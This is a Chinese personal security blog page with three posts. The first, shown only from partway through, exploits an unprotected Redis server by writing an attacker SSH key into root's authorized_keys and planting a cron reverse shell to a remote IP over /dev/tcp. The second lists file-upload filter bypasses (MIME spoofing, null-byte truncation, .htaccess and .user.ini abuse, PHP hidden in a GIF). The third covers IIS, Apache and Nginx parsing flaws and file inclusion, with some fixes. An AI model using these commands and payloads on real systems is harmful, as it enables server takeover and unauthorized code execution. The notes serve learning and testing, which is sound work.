<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"></span><br><span class="line">把key.txt文件内容写入目标主机的缓冲里：</span><br><span class="line">cat kali.txt|redis-cli -h 127.0.0.1 -x set xxx </span><br><span class="line">OK</span><br><span class="line">设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</span><br><span class="line">redis-cli -h 127.0.0.1 config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">将数据保存在服务器硬盘上</span><br><span class="line">redis-cli -h 127.0.0.1 save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<p>目标主机查看写入keys内容:</p>
<p><code>cat /root/.ssh/authorized_keys</code></p>
<ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<ul>
<li>未复现成功。<br>在crontab里写定时任务，反弹shell，原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。</li>
</ul>
<p>本机监听:</p>
<p><code>nc -l 2222</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">连接redis，写入反弹shell</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h5 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h5><p><img src="https://www.yunzhijia.com/microblog/filesvr/5bab575a50f8dd17df3a4eab" alt=""></p>

                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/09/16/【VULNERABLITY】文件上传绕过总结/">文件上传绕过总结</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2018-09-16</span>
                
            </div>
            <div class="post-content">
                
                    <ul>
<li>概述</li>
</ul>
<p><code>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据</code></p>
<p><strong>上传检测流程</strong></p>
<ul>
<li>1.客户端javascript检测（检测文件扩展名为主）</li>
<li>2.服务端MIME类型检测（检测Content-type内容）</li>
<li>3.服务端目录路径检测（检测跟path相关的内容）</li>
<li>4.服务端文件扩展名检测（检测跟文件后缀相关的内容）</li>
<li>5.服务端文件内容检测（检测内容是否合法或含有恶意代码）</li>
</ul>
<h4 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h4><p>通常此类检测会在js文件中有一个检测的函数，一般对上传的文件后缀名做检测,例如仅允许上传png,jpg,gif等类型的文件，如果检测到的文件后缀名不是在这些名单内，则不向服务器端传输文件内容。</p>
<p>使用burp，，通过burp拦包，并修改后缀后提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">_ _ _</span><br><span class="line"></span><br><span class="line">#### 服务端检测绕过（MIME类型检测）</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	if($_FILES[&apos;userfile&apos;][&apos;type&apos;] != &quot;image/gif&quot;) &#123; //检测Content-type</span><br><span class="line">		echo &quot;Sorry, we only allow uploading GIF images&quot;;</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	$uploaddir = &apos;uploads/&apos;;</span><br><span class="line">	$uploadfile = $uploaddir . basename($_FILES[&apos;userfile&apos;][&apos;name&apos;]);</span><br><span class="line">	if (move_uploaded_file($_FILES[&apos;userfile&apos;][&apos;tmp_name&apos;], $uploadfile)) 	  &#123;</span><br><span class="line">		echo &quot;File is valid, and was successfully uploaded.\n&quot;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;File uploading failed.\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>通过判断$_FILES[‘userfile’][‘type’] != “image/gif”来保证上传的类型为gif类型的文件。<br><code>绕过这一类型的检测，可以通过burp拦包，将原Content-Type类型该为符合要求的image/gif类型。</code></li>
</ol>
<hr>
<h4 id="服务端检测绕过（目录路径检测）"><a href="#服务端检测绕过（目录路径检测）" class="headerlink" title="服务端检测绕过（目录路径检测）"></a>服务端检测绕过（目录路径检测）</h4><p>某些web应用，为了标识上传的图片是属于哪个文件夹的，上传文件时会带上文件存储路径，如果对目录路径检测不够完全，可以通过截断攻击。（如<strong>%00</strong>,windows下%80-%90）(0x00)</p>
<p><code>如上传时提供存储路劲为image/20160704/可以通过修改为image/20160704/evil.php%00来达到截断目的。
后端程序会将该路径连接为image/20160704/evil.php%00filename.gif 00截断导致最终存储的文件名为evil.php</code></p>
<hr>
<h4 id="服务器端检测绕过（文件扩展名检测）"><a href="#服务器端检测绕过（文件扩展名检测）" class="headerlink" title="服务器端检测绕过（文件扩展名检测）"></a>服务器端检测绕过（文件扩展名检测）</h4><ol>
<li>黑名单检测<br><code>黑名单检测通常会有一个文件后缀名黑名单</code>（例如html|htm|php|php2|php3|php4|php5…）<br>但是通常黑名单检测不能包含所有的恶意脚本后缀，防护难度会比较大，推荐使用白名单<br>绕过的方法：</li>
<li><p><code>文件名大小写绕过（例如用Php，Asp等）</code></p>
</li>
<li><p><code>名单列表绕过</code>(用黑名单中未提及的文件后缀来绕过，如asa，cer等不常见的文件后缀)</p>
</li>
<li><p><code>0x00截断</code>（asp下可以尝试使用,asp为从后往前扫描扩展名，evil.asp%00.jpg，会被识别为jpg，只要检测方式如这种可以通过这种方式绕过）</p>
</li>
<li><p><code>特殊文件名绕过</code></p>
<p>只适用windows NTFS流<br><strong>文件名改为evil.php.或evil.php(空格)，不允许这样的命名，所以会将.和空格自动去掉。</strong></p>
</li>
</ol>
<p><code>test.php::$DATA 生成test.php,有内容</code><br><code>test.php::$DATA……. 生成test.php,有内容</code><br><code>test.php::$INDEX_ALLOCATION 生成test.php文件夹</code></p>
<h4 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击"></a>.htaccess文件攻击</h4><ol start="6">
<li><p>.htaccess文件攻击（配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测）</p>
</li>
<li><p><code>.htaccess文件攻击</code></p>
</li>
</ol>
<p>如果黑名单中未包含.htaccess后缀的可以通过重写解析配置来达到解析的效果<br>针对php，上传自定义.htaccess。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5b9e41e02711cd127f1b3a33" alt=""></p>
<p> 成因：<br><strong>在 PHP manual 中提到了下面一段话</strong></p>
<p><code>move_uploaded_file section, there is a warning which states ‘If the destination file already exists, it will be overwritten.</code></p>
<p><strong>如果 PHP 安全没配置好</strong>就可以通过 <code>move_uploaded_file</code> <strong>函数把自己写的.htaccess 文件覆盖掉服务器上的这样就能任意定义解析名单了</strong></p>
<p>这个估计很多同学看了不屑，认为是烂大街的东西了,那么下面将个新的吧。</p>
<h4 id="user-ini-文件攻击"><a href="#user-ini-文件攻击" class="headerlink" title=".user.ini 文件攻击"></a>.user.ini 文件攻击</h4><ol>
<li><p>它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法，不像.htaccess有局限性。</p>
</li>
<li><p>.user.ini都能被动态加载，也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code> 所设置的时间即可被重新加载。</p>
</li>
</ol>
<p>只要.user.ini中可以添加 auto_prepend_file=aa.jpg ，这句话可以让其他php文件执行 自动包含01.gif ，和require()一样。   </p>
<p>原理：<code>.user.ini</code>实际上就是一个可以由用户’自定义’的php.ini，我们能够自定义的设置是模式为 ”PHP_INI_REPDIR，PHP_INI_USER”的设置。</p>
<p><img src="http://www.vuln.cn/wp-content/uploads/2016/10/e9a20f6cbd6533adefa34f7c8e16ee4f.png" alt=""></p>
<hr>
<h4 id="服务器端检测绕过（文件内容检测）"><a href="#服务器端检测绕过（文件内容检测）" class="headerlink" title="服务器端检测绕过（文件内容检测）"></a>服务器端检测绕过（文件内容检测）</h4><p> 图像类的文件内容检测<br><strong>文件幻数检测（图片头格式检测）<br>jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46<br>gif内容头value= 47 49 46 38 39 61<br>png内容头value= 89 50 4E 47</strong></p>
<ul>
<li>  文件相关信息检测<br>图像文件相关信息检测常用的就是php的getimagesize()函数，可以通过修改图片的注释区（data区）插入一句话代码，如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ol>
<li>绕过 javascript 对扩展名的检测<br> &lt;用 burp 之类的反向代理工具直接 POST 数据包到服务端，绕过前端检测&gt;</li>
<li>绕过服务端对 http request 包 MIME 类型检测<br> &lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt;<br>路径/扩展名检测绕过攻击<br><img src="https://raw.githubusercontent.com/cnnetarmy/uploadfile/master/image/attack_way.png" alt=""></li>
</ol>
<ul>
<li>黑白名单绕过<br>文件名大小写绕过<br>名单列表绕过<br>特殊文件名绕过<br>0x00 截断绕过<br>.htaccess 文件攻击</li>
</ul>
<hr>
<ul>
<li>白名单绕过<br>0x00 截断绕过<br>本地文件包含漏洞<br>IIS 解析漏洞<br>Nginx 解析漏洞</li>
</ul>

                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/09/15/服务器解析漏洞(总结)/">关于服务器的上传漏洞分析</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2018-09-15</span>
                
            </div>
            <div class="post-content">
                
                    <p>很久没有归纳总结知识点了，学了那么多总感觉那么零散，所以准备开始总结这一系列的漏洞详解。一方面是总结一方面也是复习。</p>
<h6 id="文件上传练习"><a href="#文件上传练习" class="headerlink" title="文件上传练习:"></a>文件上传练习:</h6><p><a href="https://github.com/cnnetarmy/uploadfile" target="_blank" rel="noopener">https://github.com/cnnetarmy/uploadfile</a></p>
<h6 id="（一）IIS5-x-6-x解析漏洞"><a href="#（一）IIS5-x-6-x解析漏洞" class="headerlink" title="（一）IIS5.x-6.x解析漏洞"></a>（一）IIS5.x-6.x解析漏洞</h6><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<h6 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h6><h5 id="形式：www-xxx-com-xx-asp-xx-jpg"><a href="#形式：www-xxx-com-xx-asp-xx-jpg" class="headerlink" title="形式：www.xxx.com/xx.asp/xx.jpg"></a>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a></h5><p>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件</p>
<h6 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h6><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>形式：<a href="http://www.xxx.com/xx.asp:.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp:.jpg</a></p>
<p>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h6 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h6><ol>
<li>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</li>
</ol>
<h6 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h6><p>1.通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。<br>2.2.做好权限设置，限制用户创建文件夹。</p>
<hr>
<h6 id="（二）apache解析漏洞"><a href="#（二）apache解析漏洞" class="headerlink" title="（二）apache解析漏洞"></a>（二）apache解析漏洞</h6><ol>
<li>漏洞原理</li>
</ol>
<p><code>从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断`</code>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把test.php.owf.rar解析成php。`</p>
<ol start="2">
<li>漏洞形式<br><a href="http://www.xxxx.xxx.com/test.php.php123" target="_blank" rel="noopener">www.xxxx.xxx.com/test.php.php123</a></li>
</ol>
<p>(1). 漏洞原理</p>
<p><code>如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</code></p>
<p>(2)<code>如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</code></p>
<h6 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h6><p>1.apache配置文件，禁止.php. 这样的文件执行</p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5b9e15b950f8dd53ff5cec03" alt=""><br>2.用伪静态能解决这个问题，重写类似.php.*这类文件<br><code>打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so
把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:</code><br><img src="https://www.yunzhijia.com/microblog/filesvr/5b9e16849b521a370e8eaadf" alt=""></p>
<h6 id="（三）nginx解析漏洞"><a href="#（三）nginx解析漏洞" class="headerlink" title="（三）nginx解析漏洞"></a>（三）nginx解析漏洞</h6><ol>
<li>漏洞原理<br>　　<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><code>当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，
然后构造成SCRIPT_FILENAME传递给PHP CGI</code></li>
</ul>
<p><code>因为PHP的配置原因，开启fix_pathinfo这个选项了,PHP会认为SCPIPT_FILENAME是phpinfo.jpg,而1.php是PATG_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</code></p>
<h6 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h6><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a></p>
<p>版本：0.5，0.6,0.7&lt;=0.7.65&amp;&amp;08&lt;=0.8.37<br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a></p>
<p>版本：0.8.041-1.5.6<br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%20.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%20.php</a></p>
<p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p>
<h6 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h6><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5b9e1ca82711cd127f1a4161" alt=""></p>
<hr>
<h6 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h6><p><code>普通本地包含
&lt;?php include_once(&amp;_GET[‘f’]); ?&gt;</code></p>
<p>Php?f=1.txt<br><code>截断本地包含，Magic_quote_gpc为off的情况使用</code></p>
<p>Php?=1.txt%00<br><code>长文件名截断 &lt;?php include_once($_GET[‘f’].”.php”); ?&gt;</code></p>
<p>Php?f=1.txt/././././././././././././././././././…………php</p>
<h6 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h6><p>这种默认情况下关闭的套路别用了，愁人！<br><code>allow_url_include=On默认不开启，以及远程读取文件allow_url_fopen=On</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读取远程文件内容函数:</span><br><span class="line">fopen() copy() file_get_content()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">包含远程文件代码:</span><br><span class="line">include()  include_once() require() require_once()</span><br></pre></td></tr></table></figure>
<p>前面读取远程文件内容，可能会出现在上传头像处，存取远程头像。<br>后者危害可能更大，直接包含恶意代码执行导致任意代码执行。</p>

                
            </div>
        </article>
    
</div>
<div class="paginator">
    
        
        <a class="prev" href="/c1y2m3.github.io/">
            <i class="iconfont icon-prev"></i>
            上一页
        </a>
        
        
    
</div>

    </div>
</div>
<footer class="footer-social">
    

    

    

    <div class="footer-copyright">
        <p class="time-line">
            &copy;
            
            
            2019
            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
            <a target="_blank" href="https://github.com/iJinxin">John Doe</a>
        </p>
        <p class="theme-info">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
        </p>
    </div>
</footer>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="/c1y2m3.github.io/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
    

</script>
</html>
